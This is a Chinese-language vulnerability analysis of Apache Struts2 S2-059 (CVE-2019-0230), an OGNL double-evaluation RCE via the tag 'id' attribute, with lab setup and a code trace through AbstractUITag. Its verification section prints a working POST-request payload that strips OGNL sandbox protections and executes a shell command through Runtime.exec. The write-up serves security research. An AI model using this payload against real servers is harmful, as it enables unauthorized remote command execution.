# Struts2-059 远程代码执行漏洞（CVE-2019-0230）分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者：白帽汇安全研究院[@hu4wufu](https://github.com/hu4wufu "@hu4wufu")
核对：白帽汇安全研究院[@r4v3zn](https://github.com/r4v3zn "@r4v3zn")
## 前言
2020年8月13日虽然近几年来关于`ONGL`方面的漏洞已经不多了，但是毕竟是经典系列的`RCE`漏洞，还是有必要分析的。而且对于`Struts2`和`OGNL`了解也有助于代码审计和漏洞挖掘。
首先了解一下什么是`OGNL`，`Object Graphic Navigation
Language`（对象图导航语言）的缩写，`Struts`框架使用`OGNL`作为默认的表达式语言。
`struts2_S2_059`和`S2_029`漏洞产生的原理类似，都是由于标签属性值进行二次表达式解析产生的，细微差别会在分析中提到。
漏洞利用前置条件是需要特定标签的相关属性存在表达式`%{payload}`，且`payload`可控并未做安全验证。这里用到的是`a`标签`id`属性。
`id`属性是该`action`的应用`id`。
经过分析，受影响的标签有很多继承`AbstractUITag`类的标签都会受到影响，受影响的属性只有`id`。
## 环境准备
测试环境：`Tomcat 8.5.56`、`JDK 1.8.0_131`、`Struts 2.3.24`。
由于用`Maven`创建有错误没有解决，所以选用`idea`自带的创建`struts2`工程。
创建好工程后，在`web/WEB-INF`下新建`lib`文件夹，然后将下载的`jar`包复制进去即可。
`jsp`测试文件：
添加字段获取传参，并且显示到页面。
## 漏洞验证
poc1：
输入普通文本：
输入`ONGL`表达式`%{1+4}`，需要url转码`%25%7b%31%2b%34%7d%0a`
poc2：
这里发送一个post包即可，构造思路在分析和总结中提到。
    POST /s2_059/index.action HTTP/1.1
    Host: localhost:8085
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 606
    Origin: http://localhost:8085
    Connection: close
    Referer: http://localhost:8085/s2_059_war/
    Cookie: JSESSIONID=272825C954147516F847095B055202B5; JSESSIONID=01F82222F5CCED3DC9B7819AE6C98DA0
    Upgrade-Insecure-Requests: 1
    payload=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d
## 漏洞分析
我们首先看一下漏洞的调用栈：
不同版本的调用链可能会不一样，比如在较低的版本最终是在`com.opensymphony.xwork2.util.TextParseUtil.class`的`translateVariables()`方法赋值。
漏洞信息：
根据漏洞详情可知问题出现在标签解析的时候，所以我们从`org.apache.struts2.views.jsp.ComponentTagSupport`的`doStartTag`方法开始跟进，从这里开始进行`jsp`标签的解析。当用户发送请求的时候，`doStartTag()`开始执行。我们直接`debug`断点在解析标签的`ComponentTagSupport`的第一行。
在`this.populateParams()`进行赋值，所以我们跟进`populateParams()`，进行初始参数值的填充。
`org.apache.struts2.views.jsp.ui.AnchorTag.class`中存储着所有的标签对象。
`org.apache.struts2.views.jsp.ui.AbstractClosingTag.class`这里是调用了父类`AbstractUITag`的`populateParams（）`方法。
继承`AbstractUITag`类的标签都会受到影响。当这些标签存在`id`属性时，会调用父类`org.apache.struts2.views.jsp.ui.AbstractUITag.populateParams()`方法，触发`setId()`方法时会解析一次`OGNL`表达式。
往下跟父类的`populateParams()`方法。
    UIBean uiBean = (UIBean)this.component;
    uiBean.setCssClass(this.cssClass);
    uiBean.setCssStyle(this.cssStyle);
    uiBean.setCssErrorClass(this.cssErrorClass);
    uiBean.setCssErrorStyle(this.cssErrorStyle);
    uiBean.setTitle(this.title);
    uiBean.setDisabled(this.disabled);
    uiBean.setLabel(this.label);
    uiBean.setLabelSeparator(this.labelSeparator);
    uiBean.setLabelposition(this.labelPosition);
    uiBean.setRequiredposition(this.requiredposition);
    uiBean.setName(this.name);
    uiBean.setRequired(this.required);
    uiBean.setTabindex(this.tabindex);
    uiBean.setValue(this.value);
    uiBean.setTemplate(this.template);
    uiBean.setTheme(this.theme);
    uiBean.setTemplateDir(this.templateDir);
    uiBean.setOnclick(this.onclick);
    uiBean.setOndblclick(this.ondblclick);
    uiBean.setOnmousedown(this.onmousedown);
    uiBean.setOnmouseup(this.onmouseup);
    uiBean.setOnmouseover(this.onmouseover);
    uiBean.setOnmousemove(this.onmousemove);
    uiBean.setOnmouseout(this.onmouseout);
    uiBean.setOnfocus(this.onfocus);
    uiBean.setOnblur(this.onblur);
    uiBean.setOnkeypress(this.onkeypress);
    uiBean.setOnkeydown(this.onkeydown);
    uiBean.setOnkeyup(this.onkeyup);
    uiBean.setOnselect(this.onselect);
    uiBean.setOnchange(this.onchange);
    uiBean.setTooltip(this.tooltip);
    uiBean.setTooltipConfig(this.tooltipConfig);
    uiBean.setJavascriptTooltip(this.javascriptTooltip);
    uiBean.setTooltipCssClass(this.tooltipCssClass);
    uiBean.setTooltipDelay(this.tooltipDelay);
    uiBean.setTooltipIconPath(this.tooltipIconPath);
    uiBean.setAccesskey(this.accesskey);
    uiBean.setKey(this.key);
    uiBean.setId(this.id);
    uiBean.setDynamicAttributes(this.dynamicAttributes);
跟进其他属性到`org.apache.struts2.components.UIBean.class`发现`AbstractUITag.class`所有的属性除了`id`都是直接赋值。
    @StrutsTagAttribute(
        description = "The template directory."
    )